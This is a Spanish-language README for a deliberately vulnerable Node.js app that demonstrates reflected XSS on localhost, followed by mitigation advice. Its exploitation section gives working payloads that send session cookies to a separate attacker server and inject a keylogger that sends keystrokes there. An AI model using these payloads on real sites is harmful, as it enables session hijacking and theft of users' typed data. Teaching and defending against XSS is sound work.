# Cross-site Scripting (XSS)

App ejemplo de la vulnerabilidad en acción

## Requerimientos

*  [Node.js](https://nodejs.org/en/) - (LTS or superior) 

* Para Linux and Mac - usar [nvm](https://github.com/creationix/nvm) para instalar Node

*  [Git](https://git-scm.com/downloads)

## Instalación

Clonar el repositorio:

```bash
git clone https://github.com/ezequielsoler/xss-example.git
```

Ingresar al repositorio:

```bash
cd xss-example
```

Instalar las dependencia usando NPM:

```bash
npm install
```

Correr de forma local el servidor usando Node:

```bash
node server.js
```

Si todo salió bien, deberías ver el mensaje: `Server listening at localhost:3000` y al ingresar con tu navegador a  [localhost:3000](http://localhost:3000/) podrás ver la página.

## ¿Qué es XSS?

Cross-site scripting (XSS) es una vulnerabilidad de seguridad que permite a un atacante inyectar en un sitio web código malicioso del lado del cliente. Estos ataques tienen éxito si la aplicación web no emplea suficiente validación o codificación.

La variedad de ataques basados en XSS es casi ilimitado. pero comúnmente incluyen la transmisión de datos privados como cookies u otra información de sesión al atacante, la redirección de la víctima a una página web controlada por el atacante o la realización de otras operaciones maliciosas en el equipo del usuario bajo la apariencia de un sitio vulnerable.

Más info en [OWASP](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))

## Prueba de concepto

Copia y pega la siguiente URL en tu navegador:

```
http://localhost:3000/?q=%3Cimg%20src=%22does-not-exist%22%20onerror=%22alert(%27pwned!%27)%22%3E

```

Si logras ver un alert con el mensaje "pwned" ya tienes a una victima 😈

Nota: puedes usar el método `encodeURIComponent` para 'encodear' el JS a inyectar y sumarlo a la url usando la consola de tu navegador (F12) ejemplo:

```js
encodeURIComponent('<img src="does-not-exist" onerror="alert(\'pwned!\')">');
```

## Explotación

Esta aplicación genera una cookie llamada `connect.sid`. Esta es una cookie de sesión establecida por nuestro servidor web local. Haciendo uso de la vulenrabilidad XSS podemos recuperarla de la siguiente forma:

```html
<img  src="does-not-exist"  onerror="alert(document.cookie)">
```

Copia y pega la siguiente URL en tu navegador:

```
http://localhost:3000/?q=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22alert(document.cookie)%22%3E
```

Si tienes éxito, deberías ver el contenido de la cookie de sesión en una ventana emergente.

Pero, si quicieramos robar esa cookie para poder tener una sesión de la victima ¿cómo podríasmos hacerlo?

Para continuar, abre otra terminal e inicia el siguiente comando para levantar el servidor del atacante:

```bash
node evil-server.js
```

El siguiente paso será inyectar el siguiente código:

```html
<img  src="does-not-exist"  onerror="var  img  =  document.createElement(\'img\'); img.src = \'http://localhost:3001/cookie?data=\' + document.cookie; document.querySelector(\'body\').appendChild(img);">
```

Copia y pega la siguiente URL en tu navegador:

```
http://localhost:3000/?q=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20img%20%3D%20document.createElement(%27img%27)%3B%20img.src%20%3D%20%27http%3A%2F%2Flocalhost%3A3001%2Fcookie%3Fdata%3D%27%20%2B%20document.cookie%3B%20document.querySelector(%27body%27).appendChild(img)%3B%22%3E

```

Si en la terminal del servidor atacante puedes ver el valor de la cookie el ataque fue efectivo!

Aquí puedes ver el código de forma más lejible que estamos inyectando

```js
var  img = document.createElement('img');
img.src = 'http://localhost:3001/cookie?data=' + document.cookie;
document.querySelector('body').appendChild(img);
```

¿Qué otra maldad podemos hacer?

Porqué no un keylogger, es decir un script que envíe a nuestro servidor atacante las teclas precionadas por la victima.

Este sería el código:

```js
var  timeout;
var  buffer = '';

document.querySelector('body').addEventListener('keypress', function(event) {
if (event.which !== 0) {

clearTimeout(timeout);

buffer += String.fromCharCode(event.which);
timeout = setTimeout(function() {
var  xhr = new  XMLHttpRequest();
var  uri = 'http://localhost:3001/keys?data=' + encodeURIComponent(buffer);

xhr.open('GET', uri);
xhr.send();
buffer = '';
}, 400);
}
});

```

El payload sería:

```html
<img  src="does-not-exist"  onerror="var  timeout; var  buffer  = \'\'; document.querySelector(\'body\').addEventListener(\'keypress\', function(event) { if (event.which !== 0) { clearTimeout(timeout); buffer += String.fromCharCode(event.which); timeout = setTimeout(function() { var xhr = new XMLHttpRequest(); var uri = \'http://localhost:3001/keys?data=\' + encodeURIComponent(buffer); xhr.open(\'GET\', uri); xhr.send(); buffer = \'\'; }, 400); } });">
```

Copia y pega la siguiente URL en tu navegador:

```
http://localhost:3000/?q=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20timeout%3B%20var%20buffer%20%3D%20%27%27%3B%20document.querySelector(%27body%27).addEventListener(%27keypress%27%2C%20function(event)%20%7B%20if%20(event.which%20!%3D%3D%200)%20%7B%20clearTimeout(timeout)%3B%20buffer%20%2B%3D%20String.fromCharCode(event.which)%3B%20timeout%20%3D%20setTimeout(function()%20%7B%20var%20xhr%20%3D%20new%20XMLHttpRequest()%3B%20var%20uri%20%3D%20%27http%3A%2F%2Flocalhost%3A3001%2Fkeys%3Fdata%3D%27%20%2B%20encodeURIComponent(buffer)%3B%20xhr.open(%27GET%27%2C%20uri)%3B%20xhr.send()%3B%20buffer%20%3D%20%27%27%3B%20%7D%2C%20400)%3B%20%7D%20%7D)%3B%22%3E
```

## Mitigación

En esta app de ejemplo, la vulnerabilidad XSS se debe a la inserción de HTML inseguro ("sin escapar") en la página.

La app está tomando el valor de `q` y lo está insertando como HTML dentro del placeholder `$search$` y dado que HTML permite que JavaScript se ejecute en línea a través de varios atributos diferentes, esto brinda una buena oportunidad para XSS.

Hay una serie de técnicas que podemos utilizar para prevenir esta vulnerabilidad XSS en particular.

Una de las soluciones más simples para este caso en particular es indicarle al navegador que solo ejecute código JavaScript desde archivos fuente en el mismo dominio. Para hacer esto, agregamos una metaetiqueta especial al encabezado de nuestro documento HTML:

```
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

Esto no permitirá que se ejecute JavaScript en línea por lo que toda lógica JS deberá estar en un archivo separado del documento HTML (así debería ser ¿no?)

La mejor solucón es tener control y garantizar que los inputs que viajan del cliente al servidor sean correctamente validados, en este caso particular con sólo "escapar" el texto de la búsqueda evitamos la vulnerabilidad, para esto podemos usar librerías especializadas como [express-validator](https://express-validator.github.io/docs/) o [validator.js](https://github.com/validatorjs/validator.js/) 



